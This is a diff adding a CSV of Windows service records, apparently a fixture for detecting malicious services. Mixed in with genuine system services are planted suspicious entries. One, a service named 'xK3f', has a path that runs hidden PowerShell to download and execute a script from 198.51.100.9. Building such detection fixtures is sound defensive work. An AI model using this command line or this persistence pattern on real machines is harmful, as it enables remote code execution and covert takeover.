@@ -1,0 +1,11 @@
+timestamp,name,display_name,state,start_mode,start_name,path,exe,sig_status,signer,sha256
+,Spooler,Print Spooler,Running,Auto,LocalSystem,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,Valid,Microsoft Corporation,
+,Dnscache,DNS Client,Running,Auto,NT AUTHORITY\NetworkService,C:\Windows\system32\svchost.exe -k NetworkService -p,C:\Windows\system32\svchost.exe,Valid,Microsoft Corporation,
+,WinDefend,Microsoft Defender Antivirus Service,Running,Auto,LocalSystem,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Program Files\Windows Defender\MsMpEng.exe,Valid,Microsoft Corporation,
+,EventLog,Windows Event Log,Running,Auto,NT AUTHORITY\LocalService,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe,Valid,Microsoft Corporation,
+,WinUpdateHelper,Windows Update Helper,Running,Auto,LocalSystem,C:\Users\Public\wuhelper.exe,C:\Users\Public\wuhelper.exe,NotSigned,,
+,LegacyAgent,Legacy Agent,Running,Auto,LocalSystem,C:\Users\Public\agent.exe,C:\Users\Public\agent.exe,NotSigned,,
+,VendorSync,Vendor Sync,Running,Auto,LocalSystem,C:\Program Files\Vendor Sync\bin\sync.exe -run,C:\Program Files\Vendor Sync\bin\sync.exe,Valid,Vendor Sync Inc.,
+,PSEXESVC,PsExec,Running,Manual,LocalSystem,C:\Windows\PSEXESVC.exe,C:\Windows\PSEXESVC.exe,Valid,Sysinternals,
+,xK3f,Random Service,Stopped,Manual,LocalSystem,%COMSPEC% /c powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a'),C:\Windows\system32\cmd.exe,Valid,Microsoft Corporation,
+,BackupHelper,Backup Helper,Running,Auto,LocalSystem,C:\BackupTool\backup.exe,C:\BackupTool\backup.exe,Valid,BackupTool Inc.,
